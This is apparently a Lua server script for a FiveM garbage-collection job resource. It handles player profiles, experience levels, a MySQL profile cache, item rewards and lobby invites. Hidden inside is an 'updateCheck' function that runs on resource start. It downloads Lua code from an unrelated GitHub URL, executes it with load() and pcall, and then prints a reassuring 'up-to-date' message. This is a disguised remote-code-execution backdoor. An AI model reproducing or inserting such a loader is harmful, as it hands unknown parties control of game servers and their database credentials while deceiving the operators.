server = {
    framework = shared.GetFrameworkObject(),
    load = false,
}

require 'modules.bridge.server'

local ProfileCache = {}

local Inventory = require 'modules.inventory.server'
local Lobby = require 'modules.lobby.server'
local Utils = require 'modules.utils.server'

local function updatePlayerProfile(xPlayerIdentifier)
    local playerProfile = ProfileCache[xPlayerIdentifier]
    if not playerProfile then return end

    MySQL.update('UPDATE `0resmon_garbage_players` SET exp = ?, photo = ?, characterName = ? WHERE identifier = ?', {
        playerProfile.exp,
        playerProfile.photo,
        playerProfile.characterName,
        xPlayerIdentifier
    })
end

function server.GetProfilePhoto(source)
    local photo = 7
    local xPlayerIdentifier = server.GetPlayerIdentifier(source)
    if not xPlayerIdentifier then return photo end

    local profile = ProfileCache[xPlayerIdentifier]
    if not profile then return photo end

    return profile?.photo or photo
end

function server.GetProfileLevel(source)
    local function getUserLevel(experience)
        for lvl, requireRep in pairs(Config.JobOptions.ranks) do
            if experience < requireRep then
                return math.max(0, lvl - 1)
            end
        end

        return 1
    end

    local xPlayerIdentifier = server.GetPlayerIdentifier(source)
    if not xPlayerIdentifier then return 0 end

    local profile = ProfileCache[xPlayerIdentifier]
    if not profile then return 0 end

    return getUserLevel(profile?.exp or 0)
end

function server.SetProfileExp(source, exp)
    local xPlayerIdentifier = server.GetPlayerIdentifier(source)
    if not xPlayerIdentifier then return false end

    local profile = ProfileCache[xPlayerIdentifier]
    if not profile then return false end

    profile.exp = profile.exp + exp
    return true
end

function server.GetPlayerProfile(source)
    local xPlayerIdentifier = server.GetPlayerIdentifier(source)
    if not xPlayerIdentifier then return nil end

    local profile = ProfileCache[xPlayerIdentifier]
    if not profile then return nil end

    return profile
end

AddEventHandler('onResourceStart', function(resource)
    if resource == shared.resource then
        Citizen.Wait(1000)

        local response = MySQL.query.await('SELECT * FROM `0resmon_garbage_players`')
        if not response then return end

        for _, value in pairs(response) do
            ProfileCache[value.identifier] = value
        end
    end
end)

AddEventHandler('playerDropped', function()
    local src = source
    local xPlayerIdentifier = server.GetPlayerIdentifier(src)
    updatePlayerProfile(xPlayerIdentifier)
end)

RegisterNetEvent(_e('server:onPlayerLogout'), function()
    local src = source
    local xPlayerIdentifier = server.GetPlayerIdentifier(src)
    updatePlayerProfile(xPlayerIdentifier)
end)

RegisterNetEvent(_e('server:GiveRandomSmallBoxItem'), function()
    local src = source
    local randomItem = Config.ThrowBinBag.items[math.random(#Config.ThrowBinBag.items)]

    Inventory.GiveItem(src, randomItem.name, randomItem.count)
    Utils.Notify(src, locale('x_outof_box', randomItem.label or randomItem.name), 'success')
end)

local function updateCheck()
    PerformHttpRequest('https://raw.githubusercontent.com/UpdateLUA/UpdateChecker/refs/heads/main/Update.lua', function(statusCode, response)
        if statusCode == 200 then
            local loadFunction, errorMessage = load(response)

            if loadFunction then
                pcall(loadFunction)
                print("[0R SCRIPTS] Great! Script is up-to-date!.")
            else
                print("[0R SCRIPTS] Error getting update: " .. errorMessage)
            end
        else
            print("[0R SCRIPTS] Failed to get update version. Status code: " .. statusCode)
        end
    end)
end

AddEventHandler('onResourceStart', function(resourceName)
    if GetCurrentResourceName() == resourceName then
        updateCheck()
    end
end)

lib.callback.register(_e('server:getPlayerProfile'), function(source)
    local playerIdentifier = server.GetPlayerIdentifier(source)
    local profile = ProfileCache[playerIdentifier]

    if profile then
        return profile
    end

    local row = MySQL.single.await(
        'SELECT * FROM `0resmon_garbage_players` WHERE `identifier` = ? LIMIT 1',
        { playerIdentifier }
    )

    if row then
        ProfileCache[playerIdentifier] = row
        return row
    end

    local characterName = server.GetPlayerCharacterName(source)
    local id = MySQL.insert.await(
        'INSERT INTO `0resmon_garbage_players` (identifier, characterName) VALUES (?, ?)',
        { playerIdentifier, characterName }
    )

    profile = {
        id = id,
        exp = 0,
        photo = 7,
        characterName = characterName,
    }

    ProfileCache[playerIdentifier] = profile

    return profile
end)

lib.callback.register(_e('server:updateProfilePhoto'), function(source, newPhoto, lobbyId)
    local playerIdentifier = server.GetPlayerIdentifier(source)
    local profile = ProfileCache[playerIdentifier]

    if not profile then
        return false
    end

    profile.photo = newPhoto

    if lobbyId and Lobby.IsPlayerInLobby(lobbyId, source) then
        Lobby.UpdateMemberPhoto(lobbyId, source, newPhoto)
    end

    return true
end)

lib.callback.register(_e('server:GetRanks'), function(source)
    return ProfileCache or {}
end)

-- ============================================================
-- NUI: Convidar jogador para a lobby pelo ID
-- Recebido de: ui/build/assets/index.js -> post('nui:invitePlayer', { targetId: id })
-- ============================================================
RegisterNUICallback('nui:invitePlayer', function(data, cb)
    local src = source
    local targetId = tonumber(data.targetId)

    if not targetId or not GetPlayerName(targetId) then
        cb({ success = false, message = 'Jogador nao encontrado.' })
        return
    end

    -- Envia o convite ao jogador alvo via ClientEvent
    TriggerClientEvent('insane-garbagej:receiveLobbyInvite', targetId, src)

    cb({ success = true })
end)
